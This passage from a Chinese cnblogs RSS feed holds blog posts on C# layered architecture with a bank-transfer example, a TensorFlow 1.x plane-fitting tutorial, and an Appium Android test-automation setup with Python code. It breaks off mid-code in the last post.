                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (source != &lt;span&gt;null&lt;/span&gt; &amp;amp; target != &lt;span&gt;null&lt;/span&gt;) &lt;span&gt;//&lt;/span&gt;&lt;span&gt; if all accounts exist&lt;/span&gt;
&lt;span&gt;                {
                    &lt;/span&gt;&lt;span&gt;using&lt;/span&gt; (TransactionScope scope = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; TransactionScope())
                    {
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;perform transfer&lt;/span&gt;
&lt;span&gt;                        _transferService.PerformTransfer(amount, source, target);

                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;comit unit of work&lt;/span&gt;
&lt;span&gt;                        _bankAccountRepository.UnitOfWork.Commit();

                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;complete transaction&lt;/span&gt;
&lt;span&gt;                        scope.Complete();
                    }
                }
                &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
                    _logger.LogError(_resources.GetStringResource(LocalizationKeys.Application.error_CannotPerformTransferInvalidAccounts));
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
                _logger.LogError(_resources.GetStringResource(LocalizationKeys.Application.error_CannotPerformTransferInvalidAccounts));

        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;Application.MainBoundedContext.DTO项目&lt;/strong&gt;&lt;br/&gt;项目中是所有的DTO对象和使用AutoMapper转换的配置转换规则的Profile文件。&lt;br/&gt;这里的Profile文件是在Infrastructure（基础设施层）Crosscutting部分的Adapter（适配器）中AutomapperTypeAdapterFactory（AutoMapper的类型转换器创建工厂）创建AutomapperTypeAdapter（AutoMapper的类型转换器）时使用反射的方式调用的。&lt;/p&gt;
</description>
<pubDate>Thu, 07 Mar 2019 07:38:00 +0000</pubDate>
<dc:creator>net-yuan</dc:creator>
<og:description>Data部分是处理数据相关的基础组件主要包含UOW和仓储的实现。 Application（应用层）协调领域模型与其它应用、包括事务调度、UOW、数据转换等。</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/net-yuan/p/NLayerAppV3-Infrastructure_Application.html</dc:identifier>
</item>
<item>
<title>蛙蛙推荐： TensorFlow Hello World 之平面拟合 - 蛙蛙王子</title>
<link>http://www.cnblogs.com/onlytiancai/p/tf_hello_world.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/onlytiancai/p/tf_hello_world.html</guid>
<description>&lt;p&gt;tensorflow 已经发布了 2.0 alpha 版本，所以是时候学一波 tf 了。官方教程有个平面拟合的类似Hello World的例子，但没什么解释，新手理解起来比较困难。&lt;/p&gt;
&lt;p&gt;所以本文对这个案例进行详细解释，对关键的numpy, tf, matplotlib 函数加了注释，并且对原始数据和训练效果进行了可视化展示，希望对你理解这个案例有所帮助。&lt;/p&gt;
&lt;p&gt;因为 2.0 成熟还需要一段时间，所以本文使用的是 tf 1.13.1 版本，Python 代码也从 Python 2 迁移到了 Python 3。&lt;/p&gt;
&lt;p&gt;原始代码见如下链接：&lt;br/&gt;&lt;a href=&quot;http://www.tensorfly.cn/tfdoc/get_started/introduction.html&quot; class=&quot;uri&quot;&gt;http://www.tensorfly.cn/tfdoc/get_started/introduction.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;原始代码如下：&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;import tensorflow as tf
import numpy as np

# 使用 NumPy 生成假数据(phony data), 总共 100 个点.
x_data = np.float32(np.random.rand(2, 100)) # 随机输入
y_data = np.dot([0.100, 0.200], x_data) + 0.300

# 构造一个线性模型
# 
b = tf.Variable(tf.zeros([1]))
W = tf.Variable(tf.random_uniform([1, 2], -1.0, 1.0))
y = tf.matmul(W, x_data) + b

# 最小化方差
loss = tf.reduce_mean(tf.square(y - y_data))
optimizer = tf.train.GradientDescentOptimizer(0.5)
train = optimizer.minimize(loss)

# 初始化变量
init = tf.initialize_all_variables()

# 启动图 (graph)
sess = tf.Session()
sess.run(init)

# 拟合平面
for step in xrange(0, 201):
    sess.run(train)
    if step % 20 == 0:
        print step, sess.run(W), sess.run(b)

# 得到最佳拟合结果 W: [[0.100  0.200]], b: [0.300]&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;使用-numpy-生成假数据phony-data-总共-100-个点.&quot;&gt;使用 NumPy 生成假数据(phony data), 总共 100 个点.&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;x_data&lt;/code&gt; 是二维数组，每个维度各 100 个点，定义了一个平面&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;import tensorflow as tf
import numpy as np

x_data = np.float32(np.random.rand(2, 100)) # 随机输入
x_data[0][:10]&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;array([0.35073978, 0.16348423, 0.7059651 , 0.7696817 , 0.4036316 ,
       0.52306384, 0.8748454 , 0.52280265, 0.9512267 , 0.10213694],
      dtype=float32)&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;x_data[1][:10]&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;array([0.33513898, 0.07861521, 0.58426493, 0.87010854, 0.24188931,
       0.64622885, 0.39593607, 0.4805421 , 0.6906034 , 0.41190282],
      dtype=float32)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;y_data&lt;/code&gt; 由 &lt;code&gt;x_data&lt;/code&gt; 经过变换得到，&lt;code&gt;np.dot&lt;/code&gt; 实现矩阵乘法，要求第一个矩阵的列数和第二个矩阵的行数相同，最后加一个偏移量&lt;/p&gt;
&lt;p&gt;比如 &lt;code&gt;y_data[0]&lt;/code&gt; 就等于 &lt;code&gt;x_data[0][0]*0.1 + x_data[1][0]*0.2 +0.3&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这里整体的效果，相当于对原始的平面在三维空间进行了一个倾斜旋转，倾斜的参数由一个权重 &lt;code&gt;W=[0.1, 0.2]&lt;/code&gt; 和偏移量 &lt;code&gt;b=0.3&lt;/code&gt; 来确定&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;y_data = np.dot([0.100, 0.200], x_data) + 0.300
y_data[:10]&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;array([0.40210177, 0.33207147, 0.4874495 , 0.55098988, 0.38874102,
       0.48155215, 0.46667175, 0.44838868, 0.53324335, 0.39259426])&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;原始数据可视化&quot;&gt;原始数据可视化&lt;/h3&gt;
&lt;p&gt;使用 matplotlib 的 &lt;code&gt;scatter&lt;/code&gt; 功能实现 3D 散点图，x 轴是 &lt;code&gt;x_data[0]&lt;/code&gt;, y 轴是 &lt;code&gt;x_data[1]&lt;/code&gt;，z 轴是 &lt;code&gt;y_data&lt;/code&gt;&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;import matplotlib.pyplot as plt
from mpl_toolkits.mplot3d import Axes3D

x, y, z = x_data[0], x_data[1], y_data
fig = plt.figure(figsize=(20, 14))
ax = fig.add_subplot(111, projection='3d')
ax.scatter(x, y, z, c='y')
plt.show()&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/8814/201903/8814-20190307151535059-952861172.png&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;构造一个线性模型&quot;&gt;构造一个线性模型&lt;/h3&gt;
&lt;p&gt;线性模型一般由权重 &lt;code&gt;W&lt;/code&gt; 和偏移量 &lt;code&gt;b&lt;/code&gt; 来描述，平面上直线拟合 &lt;code&gt;W&lt;/code&gt; 是一个标量数字，而本例在三维空间进行平面拟合，所以 &lt;code&gt;W&lt;/code&gt; 是一个有两个分量的向量。&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;b = tf.Variable(tf.zeros([1]))
b&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;tf.Variable 'Variable:0' shape=(1,) dtype=float32_ref&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;W = tf.Variable(tf.random_uniform([1, 2], -1.0, 1.0))
W&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;tf.Variable 'Variable_1:0' shape=(1, 2) dtype=float32_ref&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;y 是模拟的结果，&lt;code&gt;tf.matmul&lt;/code&gt; 将矩阵 &lt;code&gt;A&lt;/code&gt; 乘以矩阵 &lt;code&gt;B&lt;/code&gt;，生成 &lt;code&gt;A * B&lt;/code&gt;，最后加上偏移量 &lt;code&gt;b&lt;/code&gt;&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;y = tf.matmul(W, x_data) + b
y&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;tf.Tensor 'add:0' shape=(1, 100) dtype=float32&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;最小化方差&quot;&gt;最小化方差&lt;/h3&gt;
&lt;p&gt;定义损失函数，线性回归里常用的是均方误差，就是真实值和预测值的差的平方和&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;loss = tf.reduce_mean(tf.square(y - y_data))&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;定义优化器，这里使用梯度下降算法&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;optimizer = tf.train.GradientDescentOptimizer(0.5)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;使用指定的优化器和损失函数定义一个训练&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;train = optimizer.minimize(loss)&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;初始化变量&quot;&gt;初始化变量&lt;/h3&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;init = tf.global_variables_initializer()&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;启动图-graph&quot;&gt;启动图 (graph)&lt;/h3&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;sess = tf.Session()
sess.run(init)&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;拟合平面&quot;&gt;拟合平面&lt;/h3&gt;
&lt;p&gt;我们知道真实的 &lt;code&gt;W&lt;/code&gt; 为 &lt;code&gt;[0.1, 0.2]&lt;/code&gt;，&lt;code&gt;b&lt;/code&gt; 为 &lt;code&gt;0.3&lt;/code&gt;，看下迭代训练 200 次的拟合效果怎么样&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;for step in range(0, 201):
    sess.run(train)
    if step % 20 == 0:
        print(step, sess.run(W), sess.run(b))&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;0 [[ 0.8425213  -0.12354811]] [0.13099673]
20 [[0.289453   0.12614608]] [0.2357107]
40 [[0.15044135 0.18556874]] [0.28013656]
60 [[0.11361164 0.19769716]] [0.29380444]
80 [[0.10372839 0.1998468 ]] [0.29805225]
100 [[0.10103785 0.20009856]] [0.2993837]
120 [[0.1002938  0.20006898]] [0.29980397]
140 [[0.1000846  0.20003161]] [0.2999374]
160 [[0.10002476 0.20001256]] [0.29997995]
180 [[0.10000735 0.20000464]] [0.29999357]
200 [[0.10000221 0.20000164]] [0.29999793]&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里迭代 200 次的结果 &lt;code&gt;W&lt;/code&gt; 为 &lt;code&gt;[0.10000221 0.20000164]&lt;/code&gt;, &lt;code&gt;b&lt;/code&gt; 为 &lt;code&gt;0.29999793&lt;/code&gt;，可以看出跟真实值差别非常小了&lt;/p&gt;
&lt;h3 id=&quot;拟合效果可视化&quot;&gt;拟合效果可视化&lt;/h3&gt;
&lt;p&gt;把原始的分布在三维空间的点，组成一个个的三元组，分别表示 x, y, z 的坐标值&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;import numpy as np
from mpl_toolkits.mplot3d import Axes3D
import matplotlib.pyplot as plt

points = list(zip(x_data[0],x_data[1],y_data))
points[:10]&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code&gt;[(0.35073978, 0.33513898, 0.40210177302360534),
 (0.16348423, 0.07861521, 0.33207146525382997),
 (0.7059651, 0.58426493, 0.4874494969844818),
 (0.7696817, 0.87010854, 0.5509898781776428),
 (0.4036316, 0.24188931, 0.3887410223484039),
 (0.52306384, 0.64622885, 0.4815521538257599),
 (0.8748454, 0.39593607, 0.4666717529296875),
 (0.52280265, 0.4805421, 0.44838868379592894),
 (0.9512267, 0.6906034, 0.5332433462142945),
 (0.10213694, 0.41190282, 0.3925942569971085)]&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;w_val = sess.run(W)
b_val = sess.run(b)&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;def cross(a, b):
    return [a[1]*b[2] - a[2]*b[1],
            a[2]*b[0] - a[0]*b[2],
            a[0]*b[1] - a[1]*b[0]]

# https://stackoverflow.com/questions/20699821/find-and-draw-regression-plane-to-a-set-of-points
def show(points, a, b, c):
    # 定义画布
    fig = plt.figure(figsize=(20, 14))
    ax = fig.add_subplot(111, projection='3d')

    # 绘制原始的散点
    xs, ys, zs = zip(*points)
    ax.scatter(xs, ys, zs)

    # 绘制拟合平面
    point  = np.array([0.0, 0.0, c])
    normal = np.array(cross([1,0,a], [0,1,b]))
    d = -point.dot(normal)
    xx, yy = np.meshgrid([0,1], [0,1])
    z = (-normal[0] * xx - normal[1] * yy - d) * 1. / normal[2]
    ax.plot_surface(xx, yy, z, alpha=0.2, color=[0,1,0])

    ax.set_xlabel('X')
    ax.set_ylabel('Y')
    ax.set_zlabel('Z')

    plt.show()    
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;show(points, w_val[0][0],w_val[0][1],b_val[0])&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/8814/201903/8814-20190307151425531-1988837269.png&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 07 Mar 2019 07:29:00 +0000</pubDate>
<dc:creator>蛙蛙王子</dc:creator>
<og:description>tensorflow 已经发布了 2.0 alpha 版本，所以是时候学一波 tf 了。官方教程有个平面拟合的类似Hello World的例子，但没什么解释，新手理解起来比较困难。 所以本文对这</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/onlytiancai/p/tf_hello_world.html</dc:identifier>
</item>
<item>
<title>Appium移动端自动化测试-安卓真机+模拟器启动 - 浅浅水声</title>
<link>http://www.cnblogs.com/zhuzhutest/p/10489873.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zhuzhutest/p/10489873.html</guid>
<description>&lt;p&gt;一.环境准备&lt;/p&gt;
&lt;p&gt;appium-pythin-client版本（0.17），selenium版本（2.53.6）（版本需对应，否则执行脚本可能出错，我用的是这两个版本）&lt;/p&gt;
&lt;p&gt;macOs版本10.14.1（appium默认不支持该版本，需修改配置文件），参考：&lt;a href=&quot;https://blog.csdn.net/yxys01/article/details/73551281&quot; target=&quot;_blank&quot;&gt;https://blog.csdn.net/yxys01/article/details/73551281&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;xcode版本10.1&lt;/p&gt;
&lt;p&gt;下载SDK解压后，点击tools文件里的android文件，进行相关安卓版本下载&lt;/p&gt;

&lt;p&gt;二.demo代码&lt;/p&gt;
&lt;p&gt;测试文件代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;54&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; coding=utf-8&lt;/span&gt;
&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;

author:     zhuzhuzhujt
datetime:   2019/3/5 4:09 PM
project:    appuimtest
software:   PyCharm
description:

&lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; os
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; unittest
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; appium &lt;span&gt;import&lt;/span&gt;&lt;span&gt; webdriver
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; time
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; swipeandroid as sw
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; from selenium.webdriver.support.ui import WebDriverWait&lt;/span&gt;


&lt;span&gt;#&lt;/span&gt;&lt;span&gt; Appium环境配置&lt;/span&gt;
PATH = &lt;span&gt;lambda&lt;/span&gt;&lt;span&gt; p: os.path.abspath(
    os.path.join(os.path.dirname(&lt;/span&gt;&lt;span&gt;__file__&lt;/span&gt;&lt;span&gt;), p)
)
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; print PATH&lt;/span&gt;


&lt;span&gt;class&lt;/span&gt;&lt;span&gt; DpAppTests(unittest.TestCase):
    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; setUp(self):
        desired_caps &lt;/span&gt;=&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;automationName&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Appium&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,
            &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;platformName&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Android&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,
            &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;deviceName&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;192.168.0.55:5556&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,
            &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;platformVersion&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;5.1&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,
            &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; apk包名&lt;/span&gt;
            &lt;span&gt;'&lt;/span&gt;&lt;span&gt;appPackage&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;cn.campsg.xuebaketang3.app&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,
            &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; apk的launcherActivity&lt;/span&gt;
            &lt;span&gt;'&lt;/span&gt;&lt;span&gt;appActivity&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;.MainActivity&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,
            &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 键盘相关&lt;/span&gt;
            &lt;span&gt;'&lt;/span&gt;&lt;span&gt;unicodeKeyboard&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;: True,
            &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;resetKeyboard&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;: True,
            &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 是否自动启动&lt;/span&gt;
            &lt;span&gt;'&lt;/span&gt;&lt;span&gt;autoLaunch&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;: True,
            &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 可下载地址，如果测试机无该应用会自动进行下载安装操作&lt;/span&gt;
            &lt;span&gt;'&lt;/span&gt;&lt;span&gt;app&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: PATH(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;xuebayun.apk&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;),
            &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 如果测试机已有该应用，不再进行下载安装操作&lt;/span&gt;
            &lt;span&gt;'&lt;/span&gt;&lt;span&gt;noReset&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;: True
        }
        self.driver &lt;/span&gt;= webdriver.Remote(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;http://localhost:4723/wd/hub&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, desired_caps)
        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; WebDriverWait(self.driver, 30, poll_frequency=0.5, ignored_exceptions=None)&lt;/span&gt;

    &lt;span&gt;def&lt;/span&gt;&lt;span&gt; tearDown(self):
        self.driver.quit()

    &lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; test_dpApp(self):

        time.sleep(&lt;/span&gt;10&lt;span&gt;)
        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 左滑&lt;/span&gt;
        sw.swipLeft(500&lt;span&gt;, self.driver)
        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 左滑&lt;/span&gt;
        sw.swipLeft(500&lt;span&gt;, self.driver)
        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 模拟定位点击&quot;立即体验&quot;&lt;/span&gt;
        sw.simclick(self.driver, 0.54, 0.89&lt;span&gt;)
        time.sleep(&lt;/span&gt;2&lt;span&gt;)
        self.driver.find_element_by_android_uiautomator(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;new UiSelector().text(&quot;请输入学校名称&quot;)&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;).send_keys(u&lt;span&gt;'&lt;/span&gt;&lt;span&gt;****&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
        time.sleep(&lt;/span&gt;1&lt;span&gt;)
        self.driver.find_element_by_android_uiautomator(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;new UiSelector().text(&quot;请输入账号&quot;)&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;).send_keys(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;***&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
        time.sleep(&lt;/span&gt;1&lt;span&gt;)
        self.driver.find_element_by_android_uiautomator(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;new UiSelector().text(&quot;•••••&quot;)&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;).send_keys(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;***&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
        time.sleep(&lt;/span&gt;1&lt;span&gt;)
        self.driver.find_element_by_android_uiautomator(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;new UiSelector().description(&quot;登录&quot;)&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;).click()
        time.sleep(&lt;/span&gt;4&lt;span&gt;)


&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; &lt;span&gt;__name__&lt;/span&gt; == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;__main__&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
    suite &lt;/span&gt;=&lt;span&gt; unittest.TestLoader().loadTestsFromTestCase(DpAppTests)
    unittest.TextTestRunner(verbosity&lt;/span&gt;=2).run(suite)
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;调用方法swipeandroid.py：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;62&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; coding=utf-8&lt;/span&gt;
&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;

author:     zhuzhuzhujt
datetime:   2019/3/6 11:56 AM
project:    appuimtest
software:   PyCharm
description:

&lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;


&lt;span&gt;def&lt;/span&gt;&lt;span&gt; getSize(dr):&lt;br/&gt;　　 # 获取屏幕宽高
    x &lt;/span&gt;= dr.get_window_size()[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;width&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]
    y &lt;/span&gt;= dr.get_window_size()[&lt;span&gt;'&lt;/span&gt;&lt;span&gt;height&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;]
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; x, y


&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; swipeUp(t, dr):
    l &lt;/span&gt;=&lt;span&gt; getSize(dr)
    x1 &lt;/span&gt;= int(l[0] * 0.5&lt;span&gt;)
    y1 &lt;/span&gt;= int(l[1] * 0.75&lt;span&gt;)
    y2 &lt;/span&gt;= int(l[1] * 0.25&lt;span&gt;)
    dr.swipe(x1, y1, x1, y2, t)


&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; swipeDown(t, dr):
    l &lt;/span&gt;=&lt;span&gt; getSize(dr)
    x1 &lt;/span&gt;= int(l[0] * 0.5)  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; x坐标&lt;/span&gt;
    y1 = int(l[1] * 0.25)   &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 起始y坐标&lt;/span&gt;
    y2 = int(l[1] * 0.75)   &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 终点y坐标&lt;/span&gt;
&lt;span&gt;    dr.swipe(x1, y1, x1, y2, t)


&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 屏幕向左滑动&lt;/span&gt;
&lt;span&gt;def&lt;/span&gt;&lt;span&gt; swipLeft(t, dr):
    l &lt;/span&gt;=&lt;span&gt; getSize(dr)
    x1 &lt;/span&gt;= int(l[0]*0.75&lt;span&gt;)
    y1 &lt;/span&gt;= int(l[1]*0.5&lt;span&gt;)
    x2 &lt;/span&gt;= int(l[0]*0.05&lt;span&gt;)
    dr.swipe(x1, y1, x2, y1, t)


&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 屏幕向右滑动&lt;/span&gt;
&lt;span&gt;def&lt;/span&gt;&lt;span&gt; swipRight(t, dr):
    l &lt;/span&gt;=&lt;span&gt; getSize(dr)
    x1 &lt;/span&gt;= int(l[0]*0.05&lt;span&gt;)
    y1 &lt;/span&gt;= int(l[1]*0.5&lt;span&gt;)
    x2 &lt;/span&gt;= int(l[0]*0.75&lt;span&gt;)
    dr.swipe(x1, y1, x2, y1, t)


&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; simclick(dr, xper, yper):
    &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 模拟坐标点击&lt;/span&gt;
    l =&lt;span&gt; getSize(dr)
    x1 &lt;/span&gt;= int(l[0]*&lt;span&gt;xper)
    y1 &lt;/span&gt;= int(l[1]*&lt;span&gt;yper)
    dr.swipe(x1, y1, x1, y1, &lt;/span&gt;1)
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;三.真机运行&lt;/p&gt;
&lt;p&gt;usb连接，开启开发者选项中的usb调试功能。控制台输入：adb devices查看设备列表&lt;/p&gt;
&lt;p&gt;或者通过wifi连接，手机和电脑属于同一网段且能够ping通，控制台输入：adb connect 192.168.0.55:5556（默认断口号5555，可以adb tcpip 5556进行更改）,提示连接成功后，控制台输入：adb devices查看设备&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/949572/201903/949572-20190307133928085-1923594929.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;py代码参数设置如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;45&quot;&gt;
&lt;pre&gt;
desired_caps =&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;automationName&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Appium&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;,
